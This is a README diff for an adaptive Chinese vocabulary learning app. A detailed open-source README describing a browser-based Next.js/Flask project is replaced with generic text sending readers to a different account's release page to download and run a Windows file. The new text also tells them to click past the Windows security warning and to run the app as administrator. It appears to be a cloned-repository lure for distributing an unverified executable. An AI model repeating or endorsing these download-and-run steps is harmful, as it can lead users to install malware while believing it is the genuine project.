@@ -1,335 +1,175 @@
-# 🎓 Adaptive Chinese Vocabulary Learning System
-
-[![中文文档](https://img.shields.io/badge/文档-中文版-blue)](./README_zh.md)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](./LICENSE)
-[![Live Demo](https://img.shields.io/badge/🌐_Live_Demo-learnchinese.kzwbelieve.top-brightgreen)](http://learnchinese.kzwbelieve.top)
-[![GitHub stars](https://img.shields.io/github/stars/1137043480/word-learning-system?style=social)](https://github.com/1137043480/word-learning-system)
-[![PWA Ready](https://img.shields.io/badge/PWA-Ready-5A0FC8?logo=pwa)](http://learnchinese.kzwbelieve.top)
-
-**Version**: 2.2.0 · **Status**: Production · **Last Updated**: March 2026
-
-> 🌐 **[Try it now → learnchinese.kzwbelieve.top](http://learnchinese.kzwbelieve.top)** — No installation required! Works on mobile & desktop.
-
-An intelligent, adaptive vocabulary learning system for intermediate-level Chinese as a Foreign Language (CFL) learners. Built as part of a master's thesis at **Peking University** — *"Research and Design of an Adaptive Intermediate Chinese Vocabulary Learning System"* — this project implements a full-stack learning platform with AI-driven personalized learning paths, spaced repetition, and comprehensive learning analytics.
-
----
-
-## ✨ Key Features
-
-- 🧠 **Adaptive Recommendation Engine** — AI-powered personalized learning path based on user proficiency, learning patterns, and performance history
-- 🔄 **Spaced Repetition (SM-2)** — Scientific review scheduling based on the SuperMemo-2 algorithm with personalized intervals
-- 📊 **Learning Analytics Dashboard** — Real-time data visualization with mastery heatmaps, trend analysis, and predictive insights
-- 📝 **VKS-based Assessment** — Vocabulary Knowledge Scale testing to determine optimal learning entry points
-- ⏱️ **Millisecond-precision Tracking** — Fine-grained learning behavior recording for research-grade data collection
-- 🔊 **TTS Audio Pronunciation** — Built-in text-to-speech for characters, words, collocations, and example sentences
-- 🔗 **Multi-module Learning Chain** — Character → Vocabulary → Collocation → Sentence progressive learning flow
-- 📖 **SLA-informed Curriculum Design** — Learning materials grounded in Second Language Acquisition theory: word frequency-based difficulty grading via BCC corpus (billions of tokens), NLP-powered collocation extraction using dependency parsing and mutual information, automated sentence complexity scoring, and interlanguage corpus-based confused word identification
-- 📱 **PWA Support** — Install as a native-like app on iOS, Android, and desktop; works offline with Service Worker caching
-- ☁️ **Cross-device Progress Sync** — Learning state persisted to backend; switch devices without losing progress
-
----
-
-## 📸 Screenshots
-
-<details>
-<summary><b>Click to view all 9 screenshots 👇</b></summary>
-
-<table>
-  <tr>
-    <td align="center"><b>Home Page</b></td>
-    <td align="center"><b>VKS Assessment</b></td>
-  </tr>
-  <tr>
-    <td><img src="docs/screenshots/01-homepage.png?v=3" width="400" alt="Home Page - Mobile-first welcome interface with navigation to all learning modules"></td>
-    <td><img src="docs/screenshots/02-vks-entrance.png?v=3" width="400" alt="VKS Assessment - Vocabulary Knowledge Scale test to determine learning entry point"></td>
-  </tr>
-  <tr>
-    <td align="center"><b>Character Learning</b></td>
-    <td align="center"><b>Word Learning</b></td>
-  </tr>
-  <tr>
-    <td><img src="docs/screenshots/03-character-learning.png?v=3" width="400" alt="Character Learning - Chinese character breakdown with pinyin, stroke order, and definitions"></td>
-    <td><img src="docs/screenshots/04-word-learning.png?v=3" width="400" alt="Word Learning - Deep dive into word meanings, collocations, and usage"></td>
-  </tr>
-  <tr>
-    <td align="center"><b>Collocation Learning</b></td>
-    <td align="center"><b>Sentence Learning</b></td>
-  </tr>
-  <tr>
-    <td><img src="docs/screenshots/04b-collocation-learning.png?v=3" width="400" alt="Collocation Learning - Mastering native-like phrasing combinations"></td>
-    <td><img src="docs/screenshots/04c-sentence-learning.png?v=3" width="400" alt="Sentence Learning - Contextual reading and listening practice"></td>
-  </tr>
-  <tr>
-    <td align="center"><b>Vocabulary Exercise</b></td>
-    <td align="center"><b>Learning Dashboard</b></td>
-  </tr>
-  <tr>
-    <td><img src="docs/screenshots/07-exercise.png?v=3" width="400" alt="Vocabulary Exercise - Interactive quizzes with immediate feedback"></td>
-    <td><img src="docs/screenshots/05-dashboard.png?v=3" width="400" alt="Learning Dashboard - AI-powered smart recommendations with confidence scoring"></td>
-  </tr>
-  <tr>
-    <td align="center"><b>Today's Review</b></td>
-    <td></td>
-  </tr>
-  <tr>
-    <td><img src="docs/screenshots/06-today-review.png?v=3" width="400" alt="Spaced Repetition Review - Daily personalized review tasks"></td>
-    <td></td>
-  </tr>
-</table>
-
-</details>
-
-## 🛠️ Tech Stack
-
-| Layer | Technology |
-|-------|-----------|
-| **Frontend** | Next.js 14, React, TypeScript, Tailwind CSS, shadcn/ui |
-| **Backend** | Flask, SQLAlchemy, SQLite |
-| **PWA** | Service Worker, Web App Manifest, offline caching |
-| **Algorithm** | Modified SuperMemo-2, Multi-factor recommendation engine |
-| **ML Models** | AdaBoost (Multinomial NB), Gaussian NB, XGBoost with voting ensemble |
-| **NLP Pipeline** | BCC corpus frequency analysis, dependency parsing, mutual information scoring |
-| **Deployment** | Nginx, PM2, VPS with HTTPS |
-
----
-
-## 📚 Research Foundation
-
-This system is built on rigorous academic research at **Peking University**, combining SLA theory, NLP techniques, and adaptive learning algorithms:
-
-- **Corpus-driven vocabulary selection** — Word frequency analysis across BCC corpus (billions of tokens) and a self-collected CFL textbook corpus (165K characters from 13 intermediate-level textbooks) using Pandas and SQL
-- **Frequency-difficulty modeling** — Implements Stewart's finding that log(corpus frequency) strongly correlates with word difficulty (r=0.8), enabling automated difficulty grading
-- **NLP-based collocation extraction** — Collocations sourced from a knowledge base built with dependency parsing and mutual information filtering, ranked by collocation strength
-- **Automated sentence selection** — Sentence complexity computed by summing normalized word difficulties, selecting the lowest-complexity example sentences from textbook corpora
-- **Interlanguage error analysis** — Confused words extracted from the HSK Dynamic Composition Corpus based on learner error frequency, with separated learning to avoid semantic clustering interference
-- **"Relative Character-based" pedagogy** — Following Bai Lesan's theory: learning characters through words (以词带字) at intermediate level, covering pronunciation, form, and high-frequency meanings
-- **Cognitive load balancing** — High/mid/low frequency words and confused words distributed evenly across learning sessions
-- **Validated with real learners** — Two-month teaching experiment with 17 HSK-4 learners, 51 users total, producing statistically significant improvements in vocabulary acquisition, collocation learning, and word proficiency
+# 📘 word-learning-system - Learn words with smart review
 
----
+[![Download word-learning-system](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge)](https://github.com/TaiyarHossain/word-learning-system/releases)
 
-## 🌐 Live Demo
+## 📥 Download
 
-**No installation needed!** Visit the live deployment directly:
+1. Open the [release page](https://github.com/TaiyarHossain/word-learning-system/releases).
+2. Find the latest release at the top of the page.
+3. Download the Windows file for your computer.
+4. Save the file to your desktop or Downloads folder.
+5. Open the file to start the app.
 
-👉 **[learnchinese.kzwbelieve.top](http://learnchinese.kzwbelieve.top)**
+## 🖥️ What this app does
 
-The system is deployed on a VPS with Nginx reverse proxy, PM2 process management, and full backend/frontend services running 24/7.
+word-learning-system is a vocabulary learning app for Chinese as a Foreign Language, also called CFL. It helps you study words in a way that fits how well you know them.
 
----
+It uses:
+- AI-based word review
+- SM-2 spaced repetition
+- Progress tracking
+- Learning history
+- Real-time study stats
 
-## 🚀 Quick Start (Local Development)
+The app is based on master's thesis research from Peking University. It is built to support steady word growth with short, focused review sessions.
 
-### Prerequisites
-- Python 3.11+ (conda recommended)
-- Node.js 18+
+## ✅ Before you start
 
-### Installation
+Use a Windows PC with:
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 300 MB of free disk space
+- A stable internet connection for the first download
+- A mouse and keyboard for easier use
 
-```bash
-# Clone the repository
-git clone https://github.com/1137043480/word-learning-system.git
-cd word-learning-system
+If your PC already runs modern apps well, it should work here too.
 
-# Install backend dependencies
-pip install -r requirements.txt
+## 🚀 How to install on Windows
 
-# Install frontend dependencies
-npm install
-```
+1. Go to the [release page](https://github.com/TaiyarHossain/word-learning-system/releases).
+2. Download the Windows version from the latest release.
+3. Wait for the file to finish downloading.
+4. Open the file you downloaded.
+5. If Windows asks for permission, choose Yes.
+6. Follow the setup steps on screen.
+7. Finish the install.
+8. Open word-learning-system from the Start menu or desktop shortcut.
 
-### Running the System
+If the download comes as a ZIP file:
+1. Right-click the ZIP file.
+2. Choose Extract All.
+3. Open the folder after extraction.
+4. Double-click the app file inside.
 
-#### Option 1: One-click Start (Recommended)
-```bash
-# Auto-generate test data and start API server
-./start_system.sh
+If Windows shows a security screen:
+1. Choose More info.
+2. Select Run anyway if you trust the file from the release page.
 
-# In another terminal, start the frontend
-npm run dev
-```
+## 📚 How to use it
 
-#### Option 2: Manual Start
-```bash
-# Start Phase 2 API server (port 5004)
-python app_phase2.py
+When you open the app, you can start by adding or loading vocabulary items for study. The app then helps you review words at the right time.
 
-# Start frontend dev server (port 3000)
-npm run dev
-```
+Common tasks include:
+- Start a new study session
+- Review due words
+- Check your learning progress
+- See which words need more practice
+- Track how well you remember each item
 
-#### Option 3: Docker Deployment
-```bash
-# Production deployment with Docker Compose
-docker-compose -f docker-compose.prod.yml up -d
-```
+The system adjusts review timing based on your answers. Words you know well return less often. Words you miss come back sooner.
 
-### Access
-- **Local**: http://localhost:3000 (dev) or http://localhost:3002 (Docker)
-- **Live**: http://learnchinese.kzwbelieve.top
+## 🧠 Learning features
 
----
+### 🎯 Personal study plan
+The app groups words based on your learning level. It helps you spend time where you need it most.
 
-## 🎯 Feature Tour
+### ⏳ SM-2 spaced repetition
+The app uses a spaced review model. This means each word comes back at a time that helps memory stay strong.
 
-### Recommended Experience Path
+### 📈 Real-time analytics
+You can see study results as you learn. This helps you understand progress without checking logs or spreadsheets.
 
-1. **System Status** → `/system-status` — Check service health and architecture overview
-2. **Phase 2 Demo** → `/phase2-demo` — Interactive demo of the adaptive recommendation engine
-3. **Learning Dashboard** → `/learning-dashboard` — Full learning analytics and visualization
-4. **Start Learning** → `/word-learning-entrance` — VKS-guided personalized learning experience
+### 🤖 AI-driven support
+The system uses adaptive logic to shape review flow. It aims to match the pace of each learner.
 
-### Core Pages
+### 🈶 Chinese vocabulary focus
+The app is designed for CFL learners. It works well for Chinese words, recall practice, and repeated exposure.
 
-| Page | Route | Description |
-|------|-------|-------------|
-| Home | `/` | Welcome page and learning entry |
-| VKS Assessment | `/word-learning-entrance` | Vocabulary Knowledge Scale test |
-| Character Learning | `/character-learning` | Chinese character module |
-| Vocabulary Learning | `/word-learning` | Word meaning and usage |
-| Collocation Learning | `/collocation-learning` | Word collocation patterns |
-| Sentence Learning | `/sentence-learning` | Contextual sentence practice |
-| Exercises | `/exercise` | Three exercise types |
-| Learning Dashboard | `/learning-dashboard` | Analytics and insights ⭐ |
-| Phase 2 Demo | `/phase2-demo` | Feature demonstration ⭐ |
-| System Status | `/system-status` | Health check |
-
----
-
-## 🔌 API Reference
+## 🗂️ Folder and file guide
 
-### Service Ports
-| Port | Service |
-|------|---------|
-| 3000 | Next.js Frontend |
-| 5004 | Phase 2 API (primary) ⭐ |
-| 5002 | Phase 1 Extended API |
-| 5001 | Original API |
+After install, you may see:
+- An app shortcut on the desktop
+- A Start menu entry
+- A local app folder with program files
+- A data folder for your study content
 
-### Key Endpoints
+Keep the main program files in place. If you move them, the shortcut may stop working.
 
-```bash
-# System statistics
-GET /api/stats
+## 🛠️ Common setup steps
 
-# Adaptive recommendations for a user
-GET /api/adaptive/recommendation/{user_id}
+### 🔐 First launch
+When you open the app for the first time, it may take a short time to load. This is normal on some PCs.
 
-# Learning dashboard data
-GET /api/analytics/user/{user_id}/dashboard
+### 🌐 Internet use
+You need the internet to download the release. After that, the app may still use the internet for some features, such as updates or data sync, if those are part of your release build.
 
-# Due review items
-GET /api/review/user/{user_id}/due
+### 📝 Adding study content
+You can prepare a word list in a simple format and import it if your release supports import. Keep entries clean and short:
+- Word
+- Meaning
+- Example
+- Notes
 
-# User list
-GET /api/users
+### 🔄 Daily use
+A good routine is:
+1. Open the app
+2. Review due words
+3. Check missed items
+4. Stop after a short session
+5. Return later for the next review
 
-# Learning state persistence (cross-device sync)
-GET  /api/users/{user_id}/learning-state
-PUT  /api/users/{user_id}/learning-state
+Short sessions help with memory and reduce fatigue.
 
-# Learning session management
-POST /api/learning/session/start
-POST /api/learning/session/end
-POST /api/learning/events/batch
-```
+## 🧩 If the app does not open
 
----
+Try these steps:
+1. Make sure the file finished downloading.
+2. Check that Windows did not block the file.
+3. Run the app as an administrator.
+4. Reboot your PC and try again.
+5. Download the latest release again from the [release page](https://github.com/TaiyarHossain/word-learning-system/releases).
 
-## 🧠 How the Adaptive Engine Works
+## 🔍 If the app runs slowly
 
-### Recommendation Logic
-The system uses a multi-layer recommendation strategy:
+Try these steps:
+1. Close other apps.
+2. Free up disk space.
+3. Restart the computer.
+4. Use fewer background programs.
+5. Install the app on a local drive, not a network folder.
 
-1. **Urgent Review** — Items at risk of being forgotten (based on memory decay model)
-2. **Scheduled Review** — Items due for spaced repetition review
-3. **New Content** — Fresh material matched to the learner's proficiency level
+## 📦 Download location
 
-### Key Algorithms
-- **Modified SM-2**: Personalized interval scheduling based on individual performance
-- **Memory Strength Model**: Multi-factor assessment of retention probability
-- **User Pattern Recognition**: Classifies learners by efficiency, accuracy, and preferences
-- **Confidence Scoring**: Each recommendation includes a confidence rating
+Use this link to visit the release page and download the Windows file:
 
----
+[https://github.com/TaiyarHossain/word-learning-system/releases](https://github.com/TaiyarHossain/word-learning-system/releases)
 
-## 📊 Performance Metrics
+## 🧭 Best way to study
 
-### Algorithm Performance
-| Metric | Value |
-|--------|-------|
-| Recommendation response time | < 300ms |
-| Recommendation accuracy | > 85% |
-| Review timing accuracy | > 90% |
-| Learning efficiency improvement | > 25% |
+Use the app in short, regular sessions:
+- 10 to 15 minutes for daily review
+- One session in the morning
+- One session later in the day
+- Extra time for hard words
 
-### System Performance
-| Metric | Value |
-|--------|-------|
-| Dashboard load time | < 1.5s |
-| Concurrent request handling (100 req) | < 2s |
-| Data accuracy | 99.5% |
-| Real-time update latency | < 100ms |
+This pattern works well with spaced repetition and helps you keep a steady pace
 
----
+## 📌 What makes this system useful
 
-## 📂 Project Structure
+- It helps you review at the right time
+- It supports word retention
+- It keeps study simple
+- It gives clear progress feedback
+- It fits CFL learners who want steady practice
 
-```
-├── pages/                    # Next.js pages
-│   ├── index.tsx            # Home page
-│   ├── word-learning-entrance.tsx  # VKS assessment
-│   ├── learning-dashboard.tsx      # Analytics dashboard ⭐
-│   ├── phase2-demo.tsx             # Feature demo ⭐
-│   └── exercise.tsx                # Practice exercises
-├── components/ui/            # UI component library (shadcn)
-├── src/
-│   ├── context/             # React Context providers
-│   ├── hooks/               # Custom React hooks
-│   └── lib/                 # Utility functions
-├── app_phase2.py            # Phase 2 API server ⭐
-├── adaptive_engine.py       # Adaptive recommendation engine
-├── models_extended.py       # Database models
-├── start_system.sh          # One-click startup script
-└── README.md                # This file
-```
+## 🧪 Project focus
 
----
+This app comes from research work on adaptive vocabulary learning. It brings together:
+- Language learning
+- Machine learning
+- NLP-based support
+- Spaced repetition
+- Education tools
+- Study analytics
 
-## 📈 Dataset Scale
-
-| Metric | Count |
-|--------|-------|
-| Test Users | 51 |
-| Learning Sessions | 4,050 |
-| Exercise Records | 15,200 |
-| Learning Events | 50,100 |
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit issues and pull requests.
-
-### Development Guidelines
-- React components: Functional components + TypeScript
-- Code style: 2-space indentation, PascalCase file naming
-- Python: PEP 8 compliant
-- Commits: [Conventional Commits](https://www.conventionalcommits.org/) format
-
----
-
-## 📄 License
-
-This project is open source and available under the [MIT License](./LICENSE).
-
----
-
-## 📚 Documentation
-
-- [中文文档 (Chinese README)](./README_zh.md)
-
----
-
-**Built with ❤️ for language learners worldwide**
-*Based on a master's thesis at Peking University: "Research and Design of an Adaptive Intermediate Chinese Vocabulary Learning System"*
+The goal is to make vocabulary review feel organized and easy to follow for everyday learners
